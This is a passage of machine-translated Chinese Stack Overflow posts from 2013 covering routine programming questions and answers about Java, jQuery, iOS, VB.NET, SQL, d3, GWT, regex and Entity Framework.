我可以在每个方法的顶部使用 if 语句来做到这一点，但这很容易忘记写。用什么标准机制说“这个对象现在没用了。你不能再调用它了。”？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:03:19.773

所有者让它超出范围。这是标准机制。然后你在所有 makeCall 函数中编写 if 语句，作为防御性编程（你可以争论一个断言，取决于哲学）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T20:07:07.447

java 类库中没有禁用调用。

您应该创建一个`State`枚举并在每个方法的开头检查它作为防御性编程。然后，您的班级将成为有限状态机，您可以在其中在某些状态下执行某些操作。所以你可能会被实例化，然后打开，然后关闭等等。这些信息可以编码在一个`State`枚举中，它是灵活的，并且可以在未来进行更改。

例如，

```
public class DatabaseSession {
    private State state;

    ...

    public makeCallOne() throws Exception {
        if (state == State.CLOSED)) {
            throw new Exception("Database Session has already been closed");
        }
        ...
    }
    public makeCallTwo() throws Exception {
        if (state == State.CLOSED)
            throw new Exception("Database Session has already been closed");
        }
        ...
    }

    public close() {
        state = State.CLOSED;
        ...
    }

    private enum State {
        OPEN;
        CLOSED;
    } 
```

}

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-20T20:11:37.777

据我所知，您只能使用标志做类似的事情，但是您可以将 if 语句放在验证方法中。像这样：

```
public class DatabaseSession {

    private boolean closed = false;

    private void validateSession() {
        if(closed) {
            throw new ObjectInvalidException();
        } 
    }

    public void makeCallOne() { 
        validateSession();
        /*do something*/ 
    }
    public void makeCallTwo() { 
        validateSession();
        /*do something*/
    }

    public void close() {
        closed = true;
    }
} 
```

我会定义我自己的异常（扩展`Throwable`）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T20:06:14.040

您可以使用任何特定于实例的标志，该标志将在创建对象时打开（true），并在对该对象调用 close 方法时将其设置为 OFF（false）。您可以随时检查标志的值，如果它为 OFF（设置为 false，即表示调用了对象的 close 方法），则抛出异常。

希望这可以帮助。

# jquery - 动画后更改 div 上的 z 索引

> ID：15533511
> 
> 赞同：0
> 
> 时间：2013-03-20T20:00:37.907
> 
> 标签：jquery, jquery-animate, z-index

我有 3 个 div 1 设置为 z-index1（背景图像） 1 设置为 z-index5（带有文本和链接的普通 div） 1 设置为 z-index10（前景图像）

z-index5 在另外两个 div 之间向上滑动并停止。但是，它的链接是不可点击的，因为它在前景图像下方（这是一个大部分是透明的.png）

我的问题是，一旦动画停止，如何让 z-index 向前移动以使链接变得可点击？这是我到目前为止所拥有的，但它不起作用。动画播放正确，但 zindex 似乎没有移到前景上方。提前致谢。

有问题的页面：www.titanstudio.net/about.html

动画另一个小 div 的整个 jquery 代码预加载图像并隐藏 div 直到图像被加载。

```
$(window).load(function(){
    $('#PageTitle').fadeIn(500,function(){
       $(this).animate({"left" : "100px"}, 1000);
     });
    $(function() {
        $('#contentcontain').animate({ marginTop: 40 }, 7000, function() {
            $(this).css({ zIndex: 15 });
        });
    });
    $('#undersplash').show();
    $('#oversplash').show();
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T20:04:42.600

```
$(function() {
    $('#contentcontain').animate({'margin-top': '10px'}, 7000, function() {
        $(this).css('z-index', '15');
    });     
}); 
```

# iphone - UIScrollView - 无法查看所有 UIView

> ID：15533513
> 
> 赞同：0
> 
> 时间：2013-03-20T20:00:42.617
> 
> 标签：iphone, ios, uiscrollview

当我滚动时，我无法滚动到 UIView 的末尾。

我的 UIScrollView 有 450 的高度和滚动视图内的 UIView 800 的高度。问题是scrollView 无法到达UIView 的末尾......仅向下滚动到一个点并且不显示UIView 的更多内容。（我使用故事板）

这是我启动scrollView和UIView的代码：

```
[super viewDidLoad];

[scrollView setBackgroundColor:[UIColor blackColor]];

[scrollView setCanCancelContentTouches:NO];

scrollView.clipsToBounds = YES;

scrollView.indicatorStyle = UIScrollViewIndicatorStyleWhite;

[scrollView addSubview:content];

//NSLog(@" %f  %f",content.frame.size.width,content.frame.size.height);

[scrollView setContentSize:CGSizeMake(content.frame.size.width, content.frame.size.height  )];

//NSLog(@" %f  %f",scrollView.frame.size.width,scrollView.frame.size.height );

[scrollView setScrollEnabled:YES]; 
```

对此问题的任何帮助表示赞赏。（对不起我的英语不好：（）

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T22:10:09.233

如果您在 iOS 6 项目中执行此操作，并且为情节提要启用了约束，并且如果（看起来）您发布的代码来自 viewDidLoad 方法，那么您的出口对象框架的大小将为零。使用约束，帧大小尚未确定并在 viewDidLoad 运行的执行点设置。

如果您在页面上创建一个按钮，并将代码放入该按钮的单击处理程序中，事情是否开始工作？如果是这样，那是因为在完全加载过程完成之前您无法单击该按钮——这意味着代码在完全加载过程完成后才起作用，但在您运行它的中间过程中不起作用（在 viewDidLoad 事件中）。

# vb.net - vb.net - 如何更改 DataTable 可以存储的值的类型？

> ID：15533519
> 
> 赞同：0
> 
> 时间：2013-03-20T20:01:23.880
> 
> 标签：vb.net, visual-studio-2010, datatable

我想在存储在 a 中的值中添加字符（如`%`和） ，但我收到一条错误消息：`pp``DataTable`

> 输入字符串的格式不正确。无法在实际列中存储 <97.0%>。预期类型为十进制。

如何更改`DataTable`可以存储的值的类型？

```
Dim dv As New System.Data.DataView
Dim dt As New System.Data.DataTable
dv = SQL_Customer.Select(DataSourceSelectArguments.Empty)
dt = dv.ToTable()

dt.Rows(1)(1) = CStr(dt.Rows(1)(1)) & "%"
dt.Rows(1)(2) = CStr(dt.Rows(1)(2)) & "%"
dt.Rows(1)(3) = CStr(dt.Rows(1)(3)) & "%"
dt.Rows(1)(4) = CStr(dt.Rows(1)(4)) & "pp" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:05:00.127

一旦填充数据表列，您将无法更改其类型。

一种解决方法是添加一个字符串类型的新列，然后用您需要的字符串值填充该列，然后删除您不需要的类型的列。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T14:27:53.410

如果这对某人有帮助，这就是我解决问题的方法：

```
 Dim dv As New System.Data.DataView
    Dim dt As New System.Data.DataTable
    Dim dt2 As New System.Data.DataTable
    Dim SelectedIndex As Object

    If datagrid.SelectedIndex = "-1" Then SelectedIndex = 0 Else SelectedIndex = GV_Cust.SelectedIndex

    'Populate Dataview with data in SQL Query for Customer KPIs
    dv = SQL_Customer.Select(DataSourceSelectArguments.Empty)
    'Populate table with data from dataview. Note that the data is formated as per data loaded. So if number is loaded, then format for the cell is number. This creates a problem when adding percentages
    dt = dv.ToTable()

    'New colums are added as string format in the dataTable so that % and pp can be added
    Dim column As DataColumn
    For i = 1 To 6
        ' Create second column. 
        column = New DataColumn()
        column.DataType = System.Type.GetType("System.String")
        column.ColumnName = i
        column.AutoIncrement = False
        column.Caption = i
        column.ReadOnly = False
        column.Unique = False
        ' Add the Column to the DataColumnCollection. 
        dt.Columns.Add(column)
    Next

    'New columns are populated and calculations for variances are calculated
    For j = 0 To 2
        For i = 0 To 4
            dt.Rows(i)(7 + j) = dt.Rows(i)(1 + j) & "%"
            dt.Rows(i)(10) = (dt.Rows(i)(1) - dt.Rows(i)(2)) & "pp"
            dt.Rows(i)(11) = (dt.Rows(i)(1) - dt.Rows(i)(3)) & "pp"
            dt.Rows(i)(12) = (dt.Rows(i)(2) - dt.Rows(i)(3)) & "pp"
        Next
        For i = 5 To 6
            dt.Rows(i)(7 + j) = dt.Rows(i)(1 + j)
            If dt.Rows(i)(2) = 0 Then dt.Rows(i)(10) = 0 & "%" Else dt.Rows(i)(10) = Math.Round((((dt.Rows(i)(1) / dt.Rows(i)(2))) - 1) * 100, 1) & "%"
            If dt.Rows(i)(3) = 0 Then dt.Rows(i)(11) = 0 & "%" Else dt.Rows(i)(11) = Math.Round((((dt.Rows(i)(1) / dt.Rows(i)(3))) - 1) * 100, 1) & "%"
            If dt.Rows(i)(3) = 0 Then dt.Rows(i)(12) = 0 & "%" Else dt.Rows(i)(12) = Math.Round((((dt.Rows(i)(2) / dt.Rows(i)(2))) - 1) * 100, 1) & "%"
        Next
    Next

    'Old columns are deleted and new wones are renamed
    dt.Columns.Remove("A")
    dt.Columns("1").ColumnName = "A"
    dt.Columns.Remove("B")
    dt.Columns("2").ColumnName = "B
    dt.Columns.Remove("C")
    dt.Columns("3").ColumnName = "C"
    dt.Columns.Remove("D")
    dt.Columns("4").ColumnName = "D"
    dt.Columns.Remove("D")
    dt.Columns("5").ColumnName = "E"
    dt.Columns.Remove("F")
    dt.Columns("6").ColumnName = "F"

    'Customer grid is populated, a selection button is added and the first row is selected
    datagrid.DataSource = dt
    datagrid.AutoGenerateSelectButton = True
    datagrid.DataBind()
    datagrid.SelectedIndex = SelectedIndex 
```

# html - 使只读文本区域的高度由其内容确定

> ID：15533527
> 
> 赞同：3
> 
> 时间：2013-03-20T20:01:43.913
> 
> 标签：html, css, height, textarea, readonly

我想让只读输入看起来像带有 CSS 的 pre 或 div 标签。

我原以为使用 textarea 会很容易，但这似乎是一项艰巨的任务。我可以隐藏边框和调整大小，但无论出于何种原因，我都不能让 textarea 的高度由它的内容决定。

我已经看到很多关于使用 javascript 来自动调整文本区域大小的东西，但是如果它是不需要 javascript 的静态文本，我能做些什么吗？

**更新**

我只是想澄清一下这样做的目的：我正在寻找编写，用 javascript 重写，并提交一个带有表单的只读元素，同时，不要将它限制在一个强制的内联区域，充其量是滚动，更糟糕的是，数据丢失。

**更新 2**

根据请求，我创建了一个小提琴来展示我正在尝试做的示例：http: [//jsfiddle.net/BUwdE/1/](http://jsfiddle.net/BUwdE/1/)。

```
textarea[readonly] {
    width: 100%;
    border: 0;
    resize: none;
    overflow: hidden;
} 
```

您会看到内容在底部被截断，因为 textarea 的高度不是由其内容决定的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2020-06-24T09:49:45.363

我实际上试图做你一直在做的事情。但由于它将是一个**只读**输入，我实际上最终将 CSS 应用于 div 元素。这将是一个解决我们头痛的问题。

**HTML**

```
<div class="faketextarea"> some long long text </div> 
```

**CSS**

```
.faketextarea {
   // css of a text area 
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-20T23:39:59.123

您可以使用 rows 属性在 HTML 中指定文本区域的高度，但这不会自动调整大小。你可能不得不求助于 W3C CSS 工作组来获得你想要的东西。

```
<textarea name="whatWillBeSentToServer" rows="4" readonly="readonly"> 
```

# javascript - 获取选定单选按钮的值

> ID：15533529
> 
> 赞同：0
> 
> 时间：2013-03-20T20:01:55.090
> 
> 标签：javascript

我正在尝试做一个小的 Javascript 测验，我试图让它工作的方法是检查单选按钮元素中的值是否与对象属性中的值匹配（标记为正确答案）。

```
var allQuestions = [{
question: ["Question1?", "Question2?", "Question3"], 
choices: [["choice1-1", "choice1-2", "choice1-3", "choice1-4"], ["choice2-1", "choice2-2", "choice2-3", "choice2-4"], ["choice3-1", "choice3-2", "choice3-3", "choice3-4"]], 
correctAnswer: ["choice 1-4", "choice2-3", "choice3-2"]}];  

var questions = document.getElementById('question');
var button = document.getElementById('next');
var radio = document.getElementsByName('buttons');
var a = document.getElementById('a');
var b = document.getElementById('b');
var c = document.getElementById('c');
var d = document.getElementById('d');
var labels = document.getElementsByName('labels');

for(var j=0; j < radio.length; j++) {
radio[j].value = allQuestions[0].choices[0][j];
}

for (var k=0; k < radio.length; k++) {
labels[k].innerHTML = allQuestions[0].choices[0][k];
}

var score = 0;

questions.innerHTML = allQuestions[0].question[0];
var i = 0;
var correct = allQuestions[0].correctAnswer[i];
button.onclick = function() {

if (i < allQuestions[0].question.length) {
i++;
if(radio.sel)
for(var l=0; l < radio.length; l++) {  
    questions.innerHTML = allQuestions[0].question[i]; //sets the question at top of page
    radio[l].value = allQuestions[0].choices[i][l]; //sets value of each radio button.
    //labels[l].innerHTML = allQuestions[0].choices[i][l]; //sets options for each question
    a.innerHTML = allQuestions[0].choices[i][0];
    b.innerHTML = allQuestions[0].choices[i][1];
    c.innerHTML = allQuestions[0].choices[i][2];
    d.innerHTML = allQuestions[0].choices[i][3];
    } 

} 
```

我在想，要将所选单选按钮的值与问题的正确答案相匹配，它应该类似于以下内容：

```
if(radio.checked.value == allQuestions[0].correctAnswer[i]) {
score++;
} 
```

但是当我把它放在函数的顶部时，这特别不起作用。有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:07:05.383

radio.checked 返回一个布尔值，告诉您，无论该收音机是否已检查，您都不能将其与值链接起来。

正确的方法是遍历所有具有相同名称的无线电并获取选中的无线电的值：

```
value = '';
for( i in radio ) {
    if ( radio[i].checked )
        value = radio[i].value;
} 
```

您必须根据自己的需要进行修改

# c# - 使用 .NET 方法一次下载文件 1 的最可靠方法？

> ID：15533531
> 
> 赞同：0
> 
> 时间：2013-03-20T20:01:55.817
> 
> 标签：c#, .net, download, webclient

我遇到了 WebClient.DownloadFile() 的问题，它在慢速连接上始终错误地下载文件。下载不正确，我的意思是文件的大小（以字节为单位）与预期的大小不匹配。它可以在正常的以太网连接上正常下载。这是代码：

```
internal void Start(List<FileInformation> fileList)
{
    filesCompleted = 0;
    totalNumberFiles = fileList.Count;

    using (webClient = new WebClient())
    {
        foreach (var file in fileList.OrderBy(x => x.Name))
        {
            if (file.Size > 0)
            {
                DownloadFile(file);
            }
            else
            {
                File.Create(AppStrings.FilebinPath + file.Name);
            }

            filesCompleted++;
            UpdateProgress(Convert.ToDouble(((filesCompleted / (double)totalNumberFiles) * 100).ToString("N2")));
        }
    }
}

private void DownloadFile(FileInformation file)
{
    var filePath = AppStrings.FilebinPath + file.Name;
    webClient.DownloadFile(new Uri(AppStrings.FilebinServer + file.Name), filePath);

    //Recursively retry the download until it downloads correctly.
    if ((new FileInfo(filePath).Length != file.Size))
    {
        //Added this debugging info to figure out what is going wrong.
        AppLog.WriteError("Failed to download file: " + filePath + "\nSize downloaded: " + new FileInfo(filePath).Length + "\nCorrect size: " + file.Size);
        DownloadFile(file);
    }
} 
```

对于慢速网络连接，有没有更可靠的方法来做到这一点？

编辑：这不是重复的，因为问题是关于同步下载文件，它询问最可靠的方法是什么。另一个主题是询问为什么 DownloadFilesAsync 无法正确下载文件。

编辑2：尝试了以下代码并得到了与我的第一条评论@David 中描述的相同的行为：

```
byte[] data = null;
var webRequest = (HttpWebRequest)WebRequest.Create(new Uri(AppStrings.FilebinServer + file.Name));
webRequest.ProtocolVersion = Version.Parse("1.0");
using (var webResponse = (HttpWebResponse)webRequest.GetResponse())
{
    using (var streamReader = webResponse.GetResponseStream())
    {
        data = new byte[(int)webResponse.ContentLength];

        for (var i = 0; i < data.Length; i++)
        {
            data[i] = Convert.ToByte(streamReader.ReadByte());
        }
    }
} 
```

# gwt - 在gwt中获取css类属性值？

> ID：15533532
> 
> 赞同：0
> 
> 时间：2013-03-20T20:01:57.693
> 
> 标签：gwt

我声明了一个 CSS 类：

```
gwt-Label {
  font-size: 16px;
} 
```

有没有办法可以在运行时查询 font-size 的值？就像是：

```
public void foo() {
    CssFoo css = new CssFoo("gwt-Label");
    float fontSize = css.getAttribute("font-size");
    println("Your font size is: " + fontSize);
} 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T04:53:00.657

不，你不能。

[Style 类](http://google-web-toolkit.googlecode.com/svn/javadoc/latest/com/google/gwt/dom/client/Style.html)构造函数在 GWT 中是*不可见*的。所以你不能创建一个对象。

但是您可以在 Element 上获取 Style 对象

前任：

```
 TextBox textbox= new TextBox();
 Style style = textbox.getElement().getStyle();
 String fontSize = style.getFontSize(); 
```

或通过

```
String attribute = textbox.getElement().getAttribute("fontSize");//camelcase 
```

或者

```
String styleAttribute = DOM.getStyleAttribute(textbox.getElement(), "fontSize"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T22:29:40.450

您需要一段 JSNI 代码来获取 computedValue，或者更好的选择是使用[gwtquery](https://code.google.com/p/gwtquery/)。

```
 import static com.google.gwt.query.client.GQuery.*;
 ...

 // the second parameter set to true means: return the real computed value
 double size = $(my_widget).cur("font-size", true); 
```

如果你有兴趣用 js 来做，你可以做这样的事情（它应该在现代浏览器中工作）

```
 private static final double getPropertyValue(Element elem, String prop) /*-{
   return $wnd.getComputedStyle(elem,null).getPropertyValue(prop);
 }-*/ 
```

但我会选择适用于所有浏览器的 gquery，并且更像是隐藏元素、非驼峰化属性等的解决方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-22T23:24:39.620

我最近不得不这样做，它在 GWT 中简单地解决了；

fontSize = ComputedStyle .getStyleProperty(this.getElement(), "fontSize");

这将获得您的类之前提供给它的计算值。

# d3.js - 具有长格式数据的d3中的多线图

> ID：15533533
> 
> 赞同：1
> 
> 时间：2013-03-20T20:01:58.023
> 
> 标签：d3.js

我想在 d3 中制作一个多折线图。我见过的大多数示例都使用宽格式数据。我的数据比宽格式允许的更复杂，它有多个分组结构。每个受试者在多天进行评分，并在一个治疗组中。这是一个例子：

```
Subject Score Time Group
Sub1    19.0  1    1
Sub1    19.0  2    1
Sub2    18.9  1    1
Sub2    19.1  2    1
Sub3    20.7  1    2
Sub3    19.5  2    2 
```

我想为每个**Subject制作不同的线条，但按****Group**着色。我尝试将其转换为 JSON 格式，如下所示：

```
[{"Subject" : "Sub1", "Score":"19.0", "Time":"1", "Group" : "1"} ...] 
```

我想我可以将数据转换为宽，单独添加每个 svg 路径，而不是单独选择每个 svg，然后更改颜色，但我想知道是否有一种方法可以使用这种数据结构而不必这样做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:22:21.640

听起来您根本不需要更改数据的结构。您可以[`d3.nest()`](https://github.com/mbostock/d3/wiki/Arrays#wiki-d3_nest)根据需要使用 d3 中的数据重组数据。代码看起来像（模尺度）

```
var nested = d3.nest()
               .key(function(d) { return d.Subject; })
               .entries(data);
var line = d3.svg.line()
             .x(function(d) { return d.Time; })
             .y(function(d) { return d.Score; });
svg.selectAll("path").data(nested).enter()
   .append("path")
   .attr("fill", function(d) { return color(d.values[0].Group); })
   .attr("d", function(d) { return line(d.values); }); 
```

# java - 切换 java 1.6 的类型字符串

> ID：15533534
> 
> 赞同：6
> 
> 时间：2013-03-20T20:02:00.963
> 
> 标签：java, switch-statement

我有以下代码，我想知道是否有办法使用 switch 块而不是一堆 if/else 语句。我知道 Java 从 Java 1.7 开始支持 switch 块中的字符串，但我仍在使用 Java 1.6：

```
} else if (typeName.equals("Boolean")) {

            return new SwitchInputType<Boolean>(new Boolean((String) memberValue));

        } else if (typeName.equals("Double")) {

            return new SwitchInputType<Double>(new Double((String) memberValue));

        } else if (typeName.equals("Int32")) 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-20T20:27:17.993

你甚至可以`enum`为你做这件事：

```
public static void main(String[] args) throws InterruptedException {
    String typeName = "Boolean";
    String memberValue = "memberValue";
    SwitchInputType type = Type.valueOf(typeName).makeType(memberValue);
}

enum Type {
    Boolean {
        SwitchInputType makeType(String memberValue) {
            return new SwitchInputType<Boolean>(new Boolean(memberValue));
        }
    },
    Double {
        SwitchInputType makeType(String memberValue) {
            return new SwitchInputType<Double>(new Double(memberValue));
        }
    }, 
    Int32 {
        SwitchInputType makeType(String memberValue) {
            return new SwitchInputType<Integer>(new Integer(memberValue));
        }
    };

    // All must do this.
    abstract SwitchInputType makeType(String memberValue);
}

static class SwitchInputType<T> {
    public SwitchInputType(Object o) {
    }
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-20T20:07:04.637

由于您的字符串都是有效的标识符，您可以使用这些字符串作为项目标签创建一个枚举，使用[Enum.valueOf(Class, String)](http://docs.oracle.com/javase/6/docs/api/java/lang/Enum.html#valueOf%28java.lang.Class,%20java.lang.String%29)`valueOf(String)` （或将在您的枚举类中创建的类似方法）转换为枚举类型，然后根据它进行切换...

例子：

```
enum TypeName { Boolean, Double, Int32 }

switch (TypeName.valueOf(typeName)) {
   case Boolean: // ...
   case Double: // ...
   case Int32: // ...
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T20:15:03.617

将您的字符串映射到枚举，因为枚举可用于切换案例。每个 Enum 都有一个**valueOf(String) 方法**，它将**String 类型转换为 enum 类型**。然后，您可以将此枚举与 switch 中的各种情况相匹配。您唯一需要注意的是 String 应该是要转换为枚举的有效标识符。如果字符串不是有效的标识符（即不能转换为枚举类型，那么您最终可能会得到**IllegalArgumentException**。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T20:23:56.707

Ankur 已经提出了一种方法。另一种方法是将这些定义为常量。Ex - 私有静态最终字符串 BOOLEAN = "1";

switch(Integer.parseInt(BOOLEAN)) 案例 1:...

案例2：...

等等。

# mysql - 连接两个表并选择第二个 1 中不存在的行

> ID：15533541
> 
> 赞同：0
> 
> 时间：2013-03-20T20:02:31.573
> 
> 标签：mysql, sql, database, join

我有一个名为 users 的表，其中有一个名为 Bob 的用户，如下所示：

```
username
  Bob 
```

我有另一个名为 mail 的表，其中包含以下行：

```
sender | receiver
Marley | Bob
 Saget | Bob 
```

我有另一个名为 block 的表，其中包含以下行：

```
blocker | blocked
 Marley | Bob 
```

我想从表用户中选择用户以及他们收到的消息数量，但忽略来自被阻止用户的消息。所以结果应该是这样的：

```
users.username | count_mail 
 Bob           |  1 
```

因此，正如您所看到的，我需要让 Bob 以及他收到的消息数量只有 1 条，因为 Bob 阻止了 Marley，所以 Saget 的消息应该是唯一的 1 条。

我使用以下查询，但它什么也不返回：

```
SELECT user, COUNT(mail) AS count_mail FROM users 
LEFT JOIN block ON (block.blocker = users.username) 
LEFT JOIN mail ON (mail.receiver = users.username 
                   AND mail.sender <> block.blocked) 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:08:54.303

试试这个

```
SELECT user, COUNT(mail) AS count_mail FROM users 
LEFT JOIN mail ON (mail.receiver = users.username)
WHERE (mail.sender is null 
         or NOT EXISTS
             (SELECT 1 FROM block 
              WHERE mail.sender = block.blocker
              AND mail.receiver = block.blocked)
      ) 
```

或者

```
SELECT user, COUNT(mail) AS count_mail FROM users 
LEFT JOIN (SELECT * FROM mail WHERE NOT EXISTS
                 (SELECT 1 FROM block 
                   WHERE mail.sender = block.blocker
                   AND mail.receiver = block.blocked)
          ) mail ON (mail.receiver = users.username) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T20:21:56.413

试试这个：

```
SELECT users.username, COUNT(mail.receiver) AS count_mail
FROM users 
LEFT JOIN mail ON mail.receiver = users.username 
LEFT JOIN block ON block.blocker = users.username
    AND mail.sender = block.blocked
WHERE block.blocked IS NULL
GROUP BY 1 
```

这是有效的，因为它只有在左连接到阻止程序失败时才会被命中 - 由 where 子句品尝非连接断言。

# facebook-graph-api - Facebook API 图表中的相册和照片

> ID：15533542
> 
> 赞同：0
> 
> 时间：2013-03-20T20:02:32.093
> 
> 标签：facebook-graph-api

我在 facebook 上做一个应用程序，我想要一些 API Graph 的东西，但我不知道如何访问。

使用此工具“ [https://developers.facebook.com/tools/explorer/](https://developers.facebook.com/tools/explorer/) ”，如果我选择相册，然后选择类似 fields=albums.fields(photos) 的照片，您可以看到一些照片，但如果我在源代码中执行相同操作我不知道该怎么做。我可以写 "idx($facebook->api('/me/albums/', 'data', array()); 这很好，但我怎么能在这里写 albums.fields(photos)？

就像那个[Facebook 图形 api。从相册中获取照片，](https://stackoverflow.com/questions/9486370/facebook-graph-api-get-photos-from-albums)但使用 api graph，而不是 fql。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:25:39.053

您可以将路径直接从 Graph API Explorer 复制到 Facebook SDK`api`调用中。

所以你希望你的电话是

```
id($facebook->api('/me/albums?fields=photos', 'data', array()); 
```

# regex - 正则表达式 - 排除

> ID：15533556
> 
> 赞同：0
> 
> 时间：2013-03-20T20:03:21.603
> 
> 标签：regex, words

我有这个正则表达式

```
(?!L[aAOo]s\b|Se\b|El\b|La\b|Lo\b|Los\b|Las\b|Este\b|ese\b|Aquel\b|Esta\b|Esa\b|Aquella\b|Estos\b|Esos\b|Aquellos\b|Estas\b|Esas\b|Aquellas\b|Mi\b|Tu\b|Su\b|Mis\b|Tus\b|sus\b|Mio\b|Mia\b|Tuyo\b|Tuya\b|Suyo\b|Suya\b|algún\b|alguna\b|algunos\b|algunas\b|ningún\b|ninguna\b|ningunos\b|ningunas\b|bastante\b|bastantes\b|otro\b|otra\b|otros\b|otras\b|cierto\b|cierta\b|ciertos\b|ciertas\b|poco\b|poca\b|pocos\b|pocas\b|cualquier\b|cualquiera\b|cualesquiera\b|demasiado\b|demasiada\b|demasiados\b|demasiadas\b|tal\b|tales\b|escasos\b|escasas\b|tanto\b|tanta\b|tantos\b|tantas\b|cada\b|todo\b|toda\b|todos\b|todas\b|más\b|menos\b|unos\b|unas\b|mucho\b|muchas\b|muchos\b|muchas\b|Un\b|De\b|En\b|Si\b|SALUD\b)[A-Z][a-zA-ZÑÁÉÍÓÚáéíóúñ]+ 
```

排除所有单词并接受大写单词和以大写单词开头的单词。我无法添加要排除的 SALUD 一词，为什么？

我在这里尝试[http://gskinner.com/RegExr/](http://gskinner.com/RegExr/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T23:36:17.420

`\b[A-ZÁÉÍÓÚÑ](([.]?[A-ZÁÉÍÓÚÑ])*|[a-záéíóúñ]*)\b`根据您的要求 1-4申请匹配单词。没有合理的方法可以通过增强此正则表达式从列表 5、6 中排除匹配项。您宁愿根据字典或包含所有“禁止”术语作为替代的第二个正则表达式来测试匹配项。请记住添加开始/结束标记以避免不必要的部分匹配。

即`^(El|La|...|SALUD)$`（用所有其他列入黑名单的单词替换省略号）

# c# - Entity Framework 5 方法查询汇总

> ID：15533557
> 
> 赞同：5
> 
> 时间：2013-03-20T20:03:24.587
> 
> 标签：c#, asp.net, entity-framework, asp.net-mvc-4, anonymous-types

我试图通过查询 SaleConfirmation 表来获得确认/最终购买的摘要，但是我在方法语法查询方面遇到了很多困难。

**数据库表**
这是存储最终销售额的 SaleConfirmation 表结构。

```
Id   OfferId   ProdId      Qty    SaleDate
-------------------------------------------------------
10   7         121518      150    2013-03-14 00:00:00.000
19   7         100518      35     2013-03-18 14:46:34.287
20   7         121518      805    2013-03-19 13:03:34.023
21   10        131541      10     2013-03-20 08:34:40.287 
```

*   Id：唯一的行 ID。
*   OfferId：链接到 Offer/Sale 表的外键。
*   ProdId：产品表中产品的 ID。
*   数量：销售给客户的数量。
*   SaleDate：销售完成的日期。

**控制器动作**

```
var confRollUps = db.SaleConfirmation
                  .GroupBy(c => c.OfferId) // Ensure we get a list of unique/distinct offers
                  .Select(g => g.Select(i => new {
                            i.OfferId, 
                            i.Product.Variety, // "Category" of product, will be the same across products for this offer. i.Product is a SQL Server Navigation property.
                            i.Offer.Price, // The price of the product, set per offer. i.Offer is a SQL Server Navigation property.
                            i.Offer.Quantity, // The quantity of items that are expected to be sold before the offer expires
                            i.Offer.DateClose, // Date of when the offer expires
                            g.Sum(ii => ii.Qty) // Sum up the Qty column, we don't care about ProdIds not matching
                   })); 
```

选择查询中的错误是**g.Sum(ii => ii.Qty)**并且错误如下。

> 无效的匿名类型成员声明符。必须使用成员分配、简单名称或成员访问来声明匿名类型成员。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T20:08:38.717

您只需要将匿名类型分配给变量，试试这个。

```
var confRollUps = db.SaleConfirmation
              .GroupBy(c => c.OfferId) // Ensure we get a list of unique/distinct offers
              .Select(g => g.Select(i => new {
                        OfferId = i.OfferId, 
                        ProductVariety = i.Product.Variety, // "Category" of product, will be the same across products for this offer. i.Product is a SQL Server Navigation property.
                        OfferPrice = i.Offer.Price, // The price of the product, set per offer. i.Offer is a SQL Server Navigation property.
                        OfferQty = i.Offer.Quantity, // The quantity of items that are expected to be sold before the offer expires
                        OfferDateClose =i.Offer.DateClose, // Date of when the offer expires
                        Total =g.Sum(ii => ii.Qty) // Sum up the Qty column, we don't care about ProdIds not matching
               })); 
```

# jquery - facebook 封面作为 div 背景

> ID：15533561
> 
> 赞同：-1
> 
> 时间：2013-03-20T20:03:39.107
> 
> 标签：jquery, facebook, cover

好吧，标题说我只想使用 facebook 封面作为网站中某些 div 的背景，所以每当我更新封面时，它会自动更新网站上的图像。

在另一个线程中有人说这真的很容易，但我甜甜圈有 jQuery 的技能来做代码有人可以帮我吗？

提到的线程：[如何设置 Facebook 时间线封面照片网站。对基本的 Web 开发人员来说容易吗？](https://stackoverflow.com/questions/10675632/how-to-setup-facebook-timeline-cover-photo-website-is-it-easy-for-a-basic-web)

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:17:35.480

只需将 MY_FACEBOOK_URL_NAME 替换为您的任何名称或您的图形用户 ID 号。

```
$.getJSON('http://graph.facebook.com/MY_FACEBOOK_URL_NAME?fields=cover&callback=?', function(data){
    $('#myDiv').css('background-image','url(' + data.cover.source + ')');
}); 
```

# javascript - 将 raphael js lib 包含到 android phonegap 应用程序中

> ID：15533569
> 
> 赞同：1
> 
> 时间：2013-03-20T20:04:03.903
> 
> 标签：javascript, android, cordova, raphael

我正在尝试在 android 上使用 phonegap 和 raphael js 运行一些性能测试，但是当我尝试运行应用程序时 logcat 给了我以下错误：

03-20 19:52:15.095：D/CordovaLog(4208)：未捕获的 ReferenceError：未定义 Raphael 03-20 19：52:15.095：E/Web 控制台（4208）：未捕获的 ReferenceError：未在文件中定义 Raphael： ///android_asset/www/js/classes/bootstrapper.js:58

我的 index.html 看起来像这样

```
 <!DOCTYPE html>
<!--
    Licensed to the Apache Software Foundation (ASF) under one
    or more contributor license agreements.  See the NOTICE file
